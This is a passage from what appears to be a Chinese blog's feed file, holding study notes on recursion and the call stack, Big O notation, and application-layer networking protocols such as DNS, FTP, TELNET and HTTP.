        <content type="html"><![CDATA[<h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><blockquote><p>作用：递归只是让解决方案更清晰，并没有性能上的优势，如果使用循环，程序的性能可能更高；如果使用递归，程序可能更容易理解(但在我看来，递归有时候也很难理解)</p></blockquote><p><a href="https://ypigy.gitee.io/2021/03/23/%E5%88%A9%E7%94%A8%E6%96%90%E6%B3%A2%E6%8B%89%E5%A5%91%E6%95%B0%E5%88%97%E7%90%86%E8%A7%A3%E9%80%92%E5%BD%92/" target="_blank" rel="noopener">斐波那契数列</a>就是运用递归的想法进行计算</p><h2 id="基线条件和递归条件"><a href="#基线条件和递归条件" class="headerlink" title="基线条件和递归条件"></a>基线条件和递归条件</h2><blockquote><p>每个递归函数都有两部分：基线条件（base case）和递归条件（recursive case）。递归条件指的是函数调用自己，而基线条件则指的是函数不再调用自己，从而避免形成无限循环</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基线条件</span></span><br><span class="line"><span class="keyword">if</span> (newArr.length === <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> newArr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 递归条件</span></span><br><span class="line"><span class="keyword">return</span> newArr.pop() + sum(newArr);</span><br></pre></td></tr></table></figure><p>上面为利用递归进行累加的函数</p><h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><p>栈只有两种操作：压入 （插入）和弹出（删除并读取）</p><p><img src= "/img/loading.gif" data-src="/2021/07/22/%E9%80%92%E5%BD%92/image-20210829162227622.png" alt="image-20210829162227622"></p><p>数组的压入与弹出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array.pop() <span class="comment">//弹出</span></span><br><span class="line">array.push() <span class="comment">//压入</span></span><br></pre></td></tr></table></figure><p>计算机在内部使用被称为调用栈的栈</p><h3 id="函数与调用栈"><a href="#函数与调用栈" class="headerlink" title="函数与调用栈"></a>函数与调用栈</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hi'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bye</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  hi();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'bye'</span>);</span><br><span class="line">&#125;</span><br><span class="line">bye();</span><br></pre></td></tr></table></figure><p>下面分析调用bye()发生的事</p><p>首先会为bye分配内存控件，以及该函数所创建的变量也会放到内存</p><p>接着里面会调用另一个函数，所以会在bye上面压入另一个函数hi()，开辟新的内存，同时为其变量分配内存，最后如下图，就像压入一样的操作，根据调用顺序压入内存</p><p><img src= "/img/loading.gif" data-src="/2021/07/22/%E9%80%92%E5%BD%92/image-20210829163034381.png" alt="image-20210829163034381"></p><p>接着就是函数执行，从上到下执行，先弹出最顶部的函数（对应嵌套最深的函数）进行执行，接着一步一步往下执行，最后到最底部的函数（就是最外层函数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输出：</span><br><span class="line">hi</span><br><span class="line">bye</span><br></pre></td></tr></table></figure><h2 id="实操-阶乘"><a href="#实操-阶乘" class="headerlink" title="实操-阶乘"></a>实操-阶乘</h2><p>简单阶乘的实现使用了递归</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fact = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(x == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x * fact(n<span class="number">-1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析其调用栈如何变化</p><p><img src= "/img/loading.gif" data-src="/2021/07/22/%E9%80%92%E5%BD%92/image-20210829164134539.png" alt="image-20210829164134539"></p><p><img src= "/img/loading.gif" data-src="/2021/07/22/%E9%80%92%E5%BD%92/image-20210829164213432.png" alt="image-20210829164213432"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>递归指的是调用自己的函数。 </li><li>每个递归函数都有两个条件：基线条件和递归条件。</li><li>栈有两种操作：压入和弹出。</li><li>所有函数调用都进入调用栈。</li><li>调用栈可能很长，这将占用大量的内存。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大O表示法</title>
      <link href="/2021/07/20/%E5%A4%A7O%E8%A1%A8%E7%A4%BA%E6%B3%95/"/>
      <url>/2021/07/20/%E5%A4%A7O%E8%A1%A8%E7%A4%BA%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="大O表示法"><a href="#大O表示法" class="headerlink" title="大O表示法"></a>大O表示法</h1><blockquote><p>大O表示法指出了算法有多块</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/07/20/%E5%A4%A7O%E8%A1%A8%E7%A4%BA%E6%B3%95/image-20210829095256434.png" alt="image-20210829095256434"></p><ol><li>大 O 表示法指出了最糟情况下的运行时间（算法执行步数）<ul><li>除最糟情况下的运行时间外，还应考虑平均情况的运行时间</li></ul></li></ol><h2 id="一些常见的大-O-运行时间"><a href="#一些常见的大-O-运行时间" class="headerlink" title="一些常见的大 O 运行时间"></a>一些常见的大 O 运行时间</h2><ol><li>O(log n)，也叫对数时间，这样的算法包括二分查找。 </li><li>O(n)，也叫线性时间，这样的算法包括简单查找。</li><li>O(n * log n)，一种速度较快的排序算法。</li><li>O(n2 )，一种速度较慢的排序算法。</li><li>O(n!)，包括旅行商问题等——一种非常慢的算法。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/07/20/%E5%A4%A7O%E8%A1%A8%E7%A4%BA%E6%B3%95/image-20210829095521599.png" alt="image-20210829095521599"></p><h2 id="最后总结："><a href="#最后总结：" class="headerlink" title="最后总结："></a>最后总结：</h2><blockquote><p>算法的速度指的并非时间，而是操作数的增速。</p><p>谈论算法的速度时，我们说的是随着输入的增加，其运行时间将以什么样的速度增加。 </p><p>算法的运行时间用大O表示法表示。</p><p>大O表示法省略诸如1/2这样的常数</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-应用层</title>
      <link href="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<blockquote><p>注：内容根据《计算机网络第七版》以及相关PPT整理制作，图片主要源于{电子工程出版社}，部分图片源于学校老师上课所画的图以及自己制作的思维导图</p></blockquote><h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><blockquote><p>每个应用层协议都是为了解决某一类应用问题，而问题的解决又往往是通过位于不同主机中的多个应用进程之间的通信和协同工作来完成的。应用层的具体内容就是规定应用进程在通信时所遵循的协议。</p><p>应用层的许多协议都是基于客户服务器方式。客户 (client) 和服务器 (server) 都是指通信中所涉及的两个应用进程。客户服务器方式所描述的是进程之间服务和被服务的关系。客户是服务请求方，服务器是服务提供方。 </p></blockquote><h1 id="域名系统-DNS"><a href="#域名系统-DNS" class="headerlink" title="域名系统 DNS"></a>域名系统 DNS</h1><h2 id="域名系统概述"><a href="#域名系统概述" class="headerlink" title="域名系统概述"></a>域名系统概述</h2><p>许多应用层软件经常直接使用域名系统 DNS (Domain Name System)，但计算机的用户只是<strong>间接</strong>而不是直接使用域名系统。 </p><p>互联网采用层次结构的命名树作为主机的名字，并使用分布式的域名系统 DNS。</p><p>名字到 IP 地址的解析是由若干个域名服务器程序完成的。域名服务器程序在专设的结点上运行，运行该程序的机器称为域名服务器。 </p><h2 id="互联网的域名结构"><a href="#互联网的域名结构" class="headerlink" title="互联网的域名结构"></a>互联网的域名结构</h2><p>互联网采用了层次树状结构的命名方法。</p><p>任何一个连接在互联网上的主机或路由器，都有一个唯一的层次结构的名字，即域名。</p><p>域名的结构由标号序列组成，各标号之间用点隔开：</p><blockquote><p>… . 三级域名 . 二级域名 . 顶级域名</p></blockquote><p>各标号分别代表不同级别的域名。 </p><p>在这里，域名只是个逻辑概念，并不代表计算机所在的物理地点。</p><p>变长的域名和使用有助记忆的字符串，是为了便于人来使用。而 IP 地址是定长的 32 位二进制数字则非常便于机器进行处理。</p><p>域名中的“点”和点分十进制 IP 地址中的“点”并无一一对应的关系。点分十进制 IP 地址中一定是包含三个“点”，但每一个域名中“点”的数目则不一定正好是三个。 </p><h3 id="顶级域名"><a href="#顶级域名" class="headerlink" title="顶级域名"></a>顶级域名</h3><p>国家顶级域名 nTLD，例如：</p><ol><li>.cn 表示中国，</li><li>.us 表示美国，</li><li>.uk 表示英国，等。</li></ol><p>通用顶级域名 gTLD，最早的顶级域名是：</p><ol><li>.com（公司和企业）</li><li>.net（网络服务机构</li><li>.org（非赢利性组织）</li><li>.edu（美国专用的教育机构）</li><li>.gov（美国专用的政府部门）</li><li>.mil（美国专用的军事部门）</li><li>.int（国际组织）</li></ol><p>基础结构域名 </p><ol><li>这种顶级域名只有一个，即 arpa，用于反向域名解析，因此又称为反向域名。 </li></ol><p>直接上图表示这些域名关系</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210408200642243.png" alt="image-20210408200642243"></p><h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2><p>一个服务器所负责管辖的（或有权限的）范围叫做区 (zone)。</p><p>各单位根据具体情况来划分自己管辖范围的区。但在一个区中的所有节点必须是能够连通的。</p><p>每一个区设置相应的<strong>权限域名服务器</strong>，用来保存该区中的所有主机的域名到 IP 地址的映射。</p><p>DNS 服务器的管辖范围不是以“域”为单位，而是以“区”为单位。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210408200752803.png" alt="image-20210408200752803"></p><p>树状结构的 DNS 域名服务器</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210408201212011.png" alt="image-20210408201212011"></p><p>域名服务器分为四种：</p><ol><li>根域名服务器 </li><li>顶级域名服务器 </li><li>权限域名服务器 </li><li>本地域名服务器 </li></ol><h3 id="根域名服务器"><a href="#根域名服务器" class="headerlink" title="根域名服务器"></a>根域名服务器</h3><p>根域名服务器是最高层次的域名服务器，也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和 IP 地址。</p><p>不管是哪一个本地域名服务器，若要对互联网上任何一个域名进行解析，只要自己无法解析，就首先求助于根域名服务器。</p><p>在互联网上共有 13 个不同 IP 地址的根域名服务器，它们的名字是用一个英文字母命名，从 a  一直到 m（前 13 个字母）。</p><p>这里注意：13个不同IP地址的根域名服务器并不意味着只有13个机器，而是共有13套装置</p><pre><code>a.rootservers.netb.rootservers.net… m.rootservers.net</code></pre><p>到2016年2月，全世界已经在 588 个地点安装了根域名服务器，使世界上大部分 DNS 域名服务器都能就近找到一个根域名服务器。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210408202756097.png" alt="image-20210408202756097"></p><blockquote><p> 根域名服务器并不直接把域名直接转换成 IP 地址。<br> 在使用迭代查询时，根域名服务器把下一步应当找的顶级域名服务器的 IP 地址告诉本地域名服务器。</p></blockquote><h3 id="顶级域名服务器"><a href="#顶级域名服务器" class="headerlink" title="顶级域名服务器"></a>顶级域名服务器</h3><p>顶级域名服务器（即 TLD 服务器）负责管理在该顶级域名服务器注册的所有二级域名。</p><p>当收到 DNS 查询请求时，就给出相应的回答（可能是最后的结果，也可能是下一步应当找的域名服务器的 IP 地址）。 </p><h3 id="权限域名服务器"><a href="#权限域名服务器" class="headerlink" title="权限域名服务器"></a>权限域名服务器</h3><p>负责一个区的域名服务器。</p><p>当一个权限域名服务器还不能给出最后的查询回答时，就会告诉发出查询请求的 DNS 客户，下一步应当找哪一个权限域名服务器。 </p><h3 id="本地域名服务器"><a href="#本地域名服务器" class="headerlink" title="本地域名服务器"></a>本地域名服务器</h3><p>本地域名服务器对域名系统非常重要。</p><p>当一个主机发出 DNS 查询请求时，这个查询请求报文就发送给本地域名服务器。</p><p>每一个互联网服务提供者 ISP，或一个大学，甚至一个大学里的系，都可以拥有一个本地域名服务器，这种域名服务器有时也称为默认域名服务器。</p><h3 id="提高域名服务器的可靠性"><a href="#提高域名服务器的可靠性" class="headerlink" title="提高域名服务器的可靠性"></a>提高域名服务器的可靠性</h3><p>DNS 域名服务器都把数据复制到几个域名服务器来保存，其中的一个是主域名服务器，其他的是辅助域名服务器。</p><p>当主域名服务器出故障时，辅助域名服务器可以保证 DNS 的查询工作不会中断。</p><p>主域名服务器定期把数据复制到辅助域名服务器中，而更改数据只能在主域名服务器中进行。这样就保证了数据的一致性。</p><h2 id="域名的解析过程"><a href="#域名的解析过程" class="headerlink" title="域名的解析过程"></a>域名的解析过程</h2><p><strong>主机向本地域名服务器的查询一般都是采用递归查询。</strong>如果主机所询问的本地域名服务器不知道被查询域名的 IP 地址，那么本地域名服务器就以 DNS 客户的身份（替前一个主机继续查询），向其他根域名服务器继续发出查询请求报文。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210408204141405.png" alt="image-20210408204141405"></p><blockquote><p>本地域名服务器向根域名服务器进行递归查询的比较少采用，主要使用下面的迭代查询进行</p></blockquote><p><strong>本地域名服务器向根域名服务器的查询通常是采用迭代查询。</strong>当根域名服务器收到本地域名服务器的迭代查询请求报文时，要么给出所要查询的 IP 地址，要么告诉本地域名服务器：“你下一步应当向哪一个域名服务器进行查询”。然后让本地域名服务器进行后续的查询。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210408203800415.png" alt="image-20210408203800415"></p><h2 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h2><p>每个域名服务器都维护一个高速缓存，存放最近用过的名字以及从何处获得名字映射信息的记录。</p><p>可大大减轻根域名服务器的负荷，使互联网上的 DNS 查询请求和回答报文的数量大为减少。 </p><p>为保持高速缓存中的内容正确，域名服务器应为每项内容设置计时<br>器，并处理超过合理时间的项（例如，每个项目只存放两天）。</p><p>当权限域名服务器回答一个查询请求时，在响应中都指明绑定有效存在的时间值。增加此时间值可减少网络开销，而减少此时间值可提高域名转换的准确性。 </p><h1 id="文件传送协议"><a href="#文件传送协议" class="headerlink" title="文件传送协议"></a>文件传送协议</h1><h2 id="FTP-概述"><a href="#FTP-概述" class="headerlink" title="FTP 概述"></a>FTP 概述</h2><p>文件传送协议 FTP (File Transfer Protocol) 是互联网上使用得最广泛的文件传送协议。</p><p>FTP 提供交互式的访问，允许客户指明文件的类型与格式，并允许文件具有存取权限。</p><p>FTP 屏蔽了各计算机系统的细节，因而适合于在异构网络中任意计算机之间传送文件。</p><p>RFC 959 很早就成为了互联网的正式标准。 </p><h3 id="要知道，文件传送可不是一件简单的事情"><a href="#要知道，文件传送可不是一件简单的事情" class="headerlink" title="要知道，文件传送可不是一件简单的事情"></a>要知道，文件传送可不是一件简单的事情</h3><p>网络环境中的一项基本应用就是将文件从一台计算机中复制到另一台可能相距很远的计算机中。</p><p>初看起来，在两个主机之间传送文件是很简单的事情。</p><p>其实这往往非常困难。原因是众多的计算机厂商研制出的文件系统多达数百种，且差别很大。 </p><h2 id="FTP-的基本工作原理"><a href="#FTP-的基本工作原理" class="headerlink" title="FTP 的基本工作原理"></a>FTP 的基本工作原理</h2><p>网络环境下复制文件的复杂性：</p><ol><li>计算机存储数据的格式不同。</li><li>文件的目录结构和文件命名的规定不同。</li><li>对于相同的文件存取功能，操作系统使用的命令不同。</li><li>访问控制方法不同。 </li></ol><h2 id="FTP工作特点"><a href="#FTP工作特点" class="headerlink" title="FTP工作特点"></a>FTP工作特点</h2><p>文件传送协议 FTP 只提供文件传送的一些基本的服务，它使用 TCP 可靠的运输服务。</p><p>FTP 的主要功能是减少或消除在不同操作系统下处理文件的不兼容性。</p><p>FTP 使用客户服务器方式。一个 FTP 服务器进程可同时为多个客户进程提供服务。FTP 的服务器进程由两大部分组成：一个主进程，负责接受新的请求；另外有若干个从属进程，负责处理单个请求。</p><h3 id="工作步骤"><a href="#工作步骤" class="headerlink" title="工作步骤"></a>工作步骤</h3><ol><li><p>打开熟知端口（端口号为 21），使客户进程能够连接上。</p></li><li><p>等待客户进程发出连接请求。</p></li><li><p>启动从属进程来处理客户进程发来的请求。从属进程对客户进程的请求处理完毕后即终止，但从属进程在运行期间根据需要还可能创建其他一些子进程。</p></li><li><p>回到等待状态，继续接受其他客户进程发来的请求。主进程与从属进程的处理是并发地进行。 </p></li></ol><h3 id="FTP-使用的两个-TCP-连接"><a href="#FTP-使用的两个-TCP-连接" class="headerlink" title="FTP 使用的两个 TCP 连接"></a>FTP 使用的两个 TCP 连接</h3><p><strong>控制连接</strong>在整个会话期间一直保持打开，FTP 客户发出的传送请求通过控制连接发送给服务器端的控制进程，但控制连接不用来传送文件。</p><p>实际用于传输文件的是<strong>“数据连接”</strong>。服务器端的控制进程在接收到 FTP 客户发送来的文件传输请求后就创建“数据传送进程”和“数据连接”，用来连接客户端和服务器端的数据传送进程。</p><p><strong>数据传送进程实际完成文件的传送</strong>，在传送完毕后关闭“数据传送连接”并结束运行。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210408214816503.png" alt="image-20210408214816503"></p><p>那么这个过程是否就需要占用两个端口号来建立两个不同的连接嘞，答案是肯定的</p><ol><li>当客户进程向服务器进程发出建立连接请求时，要寻找连接服务器进程的熟知端口 (21)，同时还要告诉服务器进程自己的另一个端口号码，用于建立数据传送连接。</li><li>接着，服务器进程用自己传送数据的熟知端口 (20) 与客户进程所提供的端口号码建立数据传送连接。</li><li>由于 FTP 使用了两个不同的端口号，所以数据连接与控制连接不会发生混乱。</li></ol><p>这样的好处是啥</p><ol><li>使协议更加简单和更容易实现。</li><li>在传输文件时还可以利用控制连接（例如，客户发送请求终止传输）。</li></ol><h2 id="简单文件传送协议-TFTP"><a href="#简单文件传送协议-TFTP" class="headerlink" title="简单文件传送协议 TFTP"></a>简单文件传送协议 TFTP</h2><p>TFTP (Trivial File Transfer Protocol) 是一个很小且易于实现的文件传送协议。</p><p>TFTP 使用客户服务器方式和使用 UDP 数据报，因此 TFTP 需要有自己的差错改正措施。</p><p>TFTP 只支持文件传输而不支持交互。</p><p>TFTP 没有一个庞大的命令集，没有列目录的功能，也不能对用户进行身份鉴别。 </p><h3 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h3><ul><li>每次传送的数据 PDU 中有 512 字节的数据，但最后一次可不足 512 字节。</li><li>数据 PDU 也称为文件块 (block)，每个块按序编号，从 1 开始。</li><li>支持 ASCII 码或二进制传送。</li><li>可对文件进行读或写。</li><li>使用很简单的首部。 </li></ul><h3 id="如同停止等待协议"><a href="#如同停止等待协议" class="headerlink" title="如同停止等待协议"></a>如同停止等待协议</h3><ul><li>发送完一个文件块后就等待对方的确认，确认时应指明所确认的块编号。</li><li>发完数据后<strong>在规定时间内收不到确认就要重发数据 PDU</strong>。</li><li>发送确认 PDU 的一方<strong>若在规定时间内收不到下一个文件块，也要重发确认 PDU</strong>。这样就可保证文件的传送不致因某一个数据报的丢失而告失败。 </li><li>开始工作时，TFTP 客户进程发送一个读请求 PDU 或写请求 PDU 给 TFTP 服务器进程，其熟知端口号码为  69。</li><li>TFTP 服务器进程要选择一个新的端口和 TFTP 客户进程进行通信。</li><li>若文件长度恰好为 512 字节的整数倍，则在文件传送完毕后，还必须在最后发送一个只含首部而无数据的数据 PDU。</li><li>若文件长度不是 512 字节的整数倍，则最后传送数据 PDU 的数据字段一定不满 512 字节，这正好可作为文件结束的标志。</li></ul><h1 id="远程终端协议-TELNET"><a href="#远程终端协议-TELNET" class="headerlink" title="远程终端协议 TELNET"></a>远程终端协议 TELNET</h1><p>TELNET 是一个简单的远程终端协议，也是互联网的正式标准。</p><p>用户用 TELNET 就可在其所在地通过 TCP 连接注册（即登录）到远地的另一个主机上（使用主机名或 IP 地址）。</p><p>TELNET 能将用户的击键传到远地主机，同时也能将远地主机的输出通过 TCP 连接返回到用户屏幕。这种服务是透明的，因为用户感觉到好像键盘和显示器是直接连在远地主机上。 </p><p>现在由于 PC 的功能越来越强，用户已较少使用 TELNET 了。</p><p>TELNET 也使用客户服务器方式。在本地系统运行 TELNET 客户进程，而在远地主机则运行 TELNET 服务器进程。</p><p>和 FTP 的情况相似，服务器中的主进程等待新的请求，并产生从属进程来处理每一个连接。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409070642758.png" alt="image-20210409070642758"></p><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p>客户软件把用户的击键和命令转换成 <strong>NVT 格式</strong>，并送交服务器。</p><p>服务器软件把收到的数据和命令，从 <strong>NVT 格式转换成远地系统所需的格式</strong>。</p><p>向用户返回数据时，服务器把<strong>远地系统的格式转换为 NVT 格式</strong>，本地客户再从 <strong>NVT 格式转换到本地系统所需的格式</strong>。 </p><h1 id="万维网-WWW🔺"><a href="#万维网-WWW🔺" class="headerlink" title="万维网 WWW🔺"></a>万维网 WWW🔺</h1><h2 id="万维网概述"><a href="#万维网概述" class="headerlink" title="万维网概述"></a>万维网概述</h2><blockquote><p>万维网 WWW (World Wide Web) 并非某种特殊的计算机网络。<br>万维网是一个大规模的、联机式的信息储藏所。<br>万维网用链接的方法能非常方便地从互联网上的一个站点访问另一个站点，从而主动地按需获取丰富的信息。<br>这种访问方式称为“链接”。</p></blockquote><p>万维网提供分布式服务</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409070913440.png" alt="image-20210409070913440"></p><p>万维网是<strong>分布式超媒体 (hypermedia) 系统</strong>，它是<strong>超文本 (hypertext) 系统</strong>的扩充。</p><p><strong>一个超文本由多个信息源链接成。</strong>利用一个链接可使用户找到另一个文档。这些文档可以位于世界上任何一个接在互联网上的超文本系统中。超文本是万维网的基础。</p><p><strong>超媒体与超文本的区别是文档内容不同。</strong>超文本文档仅包含文本信息，而超媒体文档还包含其他表示方式的信息，如图形、图像、声音、动画，甚至活动视频图像。</p><h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><p>万维网以<strong>客户 - 服务器</strong>方式工作。</p><p>浏览器就是在用户计算机上的万维网客户程序。万维网文档所驻留的计算机则运行服务器程序，因此这个计算机也称为万维网服务器。</p><p>客户程序向服务器程序<strong>发出请求</strong>，服务器程序向客户程序<strong>送回</strong>客户所要的<strong>万维网文档</strong>。</p><p>在一个客户程序主窗口上显示出的万维网文档称为页面 (page)。</p><p>好的，问题来了，通过以下问题，我们将直接引出后几节的内容</p><p>(1) 怎样标志分布在整个互联网上的万维网文档？<br>使用<strong>统一资源定位符 URL</strong> (Uniform Resource Locator) 来标志万维网上的各种文档。使每一个文档在整个互联网的范围内具有唯一的标识符 URL。 </p><p>(2) 用何协议实现万维网上各种超链的链接？<br>在万维网客户程序与万维网服务器程序之间进行交互所使用的协议，是<strong>超文本传送协议 HTTP (HyperText Transfer Protocol)</strong>。<br>HTTP 是一个应用层协议，它<strong>使用 TCP 连接进行可靠的传送</strong>。 </p><p>(3) 怎样使各种万维网文档都能在互联网上的各种计算机上显示出来，同时使用户清楚地知道在什么地方存在着超链？<br><strong>超文本标记语言 HTML (HyperText Markup Language)</strong> 使得万维网页面的设计者可以很方便地用一个超链从本页面的某处链接到互联网上的任何一个万维网页面，并且能够在自己的计算机屏幕上将这些页面显示出来。 </p><p>(4) 怎样使用户能够很方便地找到所需的信息？<br>为了在万维网上方便地查找信息，用户可使用各种<strong>的搜索工具（即搜索引擎）</strong>。 </p><h2 id="统一资源定位符-URL"><a href="#统一资源定位符-URL" class="headerlink" title="统一资源定位符 URL"></a>统一资源定位符 URL</h2><p>资源定位符 URL 是对可以从互联网上得到的资源的位置和访问方法的一种简洁表示。<br>URL 给资源的位置提供一种抽象的识别方法，并用这种方法给资源定位。<br>只要能够对资源定位，系统就可以对资源进行各种操作，如存取、更新、替换和查找其属性。<br>URL 相当于一个文件名在网络范围的扩展。因此 <strong>URL 是与互联网相连的机器上的任何可访问对象的一个指针</strong>。 </p><h3 id="URL-的一般形式"><a href="#URL-的一般形式" class="headerlink" title="URL 的一般形式"></a>URL 的一般形式</h3><p>由以冒号隔开的两大部分组成，并且在 URL 中的字符对大写或小写没有要求。</p><p>注意：对大小写没有要求，也就是说不管你输入home还是HOME，它的意思都是一样的</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409072803806.png" alt="image-20210409072803806"></p><p>&lt;主机&gt; 是存放资源的主机在互联网中的域名</p><p>现在有些浏览器为了方便用户，在输入 URL 时，可以把最前面的“http://”甚至把主机名最前面的“www”省略，然后浏览器替用户把省略的字符添上。<br>例如，用户只要键入 ypigy.gitee.io，浏览器就自动把未键入的字符补齐，变成<a href="https://ypigy.gitee.io/。" target="_blank" rel="noopener">https://ypigy.gitee.io/。</a></p><p><a href="https://ypigy.gitee.io/2021/03/01/%E5%85%AD%E3%80%81Vue%20Router%E5%85%A5%E9%97%A8/#URL" target="_blank" rel="noopener">HTTP格式的URL</a>，点击了解完整url的含义</p><h2 id="超文本传送协议-HTTP"><a href="#超文本传送协议-HTTP" class="headerlink" title="超文本传送协议 HTTP"></a>超文本传送协议 HTTP</h2><p>为了使超文本的链接能够高效率地完成，需要用 HTTP 协议来传送一切必须的信息。<br>从层次的角度看，HTTP 是面向事务的 (transaction-oriented) 应用层协议，它是万维网上能够可靠地交换文件（包括文本、声音、图像等各种多媒体文件）的重要基础。 </p><h3 id="万维网的工作过程"><a href="#万维网的工作过程" class="headerlink" title="万维网的工作过程"></a>万维网的工作过程</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409073310895.png" alt="image-20210409073310895"></p><p>每个万维网网点都有一个服务器进程，它不断地监听 TCP 的端口 80，以便发现是否有浏览器向它发出连接建立请求。<br>一旦监听到连接建立请求并建立了 TCP 连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后，TCP 连接就被释放了。</p><blockquote><p>在浏览器和服务器之间的<strong>请求</strong>和<strong>响应</strong>的交互，必须按照规定的格式和遵循一定的规则。<strong>这些格式和规则就是超文本传送协议 HTTP</strong>。</p></blockquote><p>HTTP 规定在 HTTP 客户与 HTTP 服务器之间的每次交互，都由一个 ASCII 码串构成的请求和一个类似的通用互联网扩充，即“类 MIME (MIME-like)”的响应组成。</p><p><strong>最后再强调一遍：HTTP 报文通常都使用 TCP 连接传送。</strong></p><h3 id="HTTP-的主要特点"><a href="#HTTP-的主要特点" class="headerlink" title="HTTP 的主要特点"></a>HTTP 的主要特点</h3><ol><li>HTTP 使用了<strong>面向连接的 TCP</strong> 作为运输层协议，保证了数据的可靠传输。</li><li>HTTP 协议本身也是<strong>无连接的</strong>，虽然它使用了面向连接的 TCP 向上提供的服务。</li><li>HTTP 是<strong>面向事务</strong>的客户服务器协议。</li><li>HTTP 1.0 协议是<strong>无状态</strong>的 (stateless)。</li></ol><p>下面我们通过三报文握手来了解http协议的工作</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409082643731.png" alt="image-20210409082643731"></p><p>通过图可以看到：http请求报文是作为第三次报文发送的，这时连接也建立好了，服务器就会将请求所需要的资源发送给客户端</p><p>这个过程过后，客户端接收到了资源后，便会断开tcp连接，然后下一次需要的时候继续建立连接，然后传递数据，而如果说现在你要请求一个包含很多资源（比如很多图片）的网页，那么客户端首先建立第一次tcp连接用于请求html页面，之后资源收到断开连接后又继续发起一次tcp连接，记住：http连接是无状态，也就意味着你每次建立连接都是全新的，耗时是一样的，且如果需要登录的话，会重复登陆，这次请求是一张图片，接下来还有其它资源，就要重复发起一次又一次的tcp连接，这样会很没有效率，如何解决这个问题呢 </p><h3 id="持续连接"><a href="#持续连接" 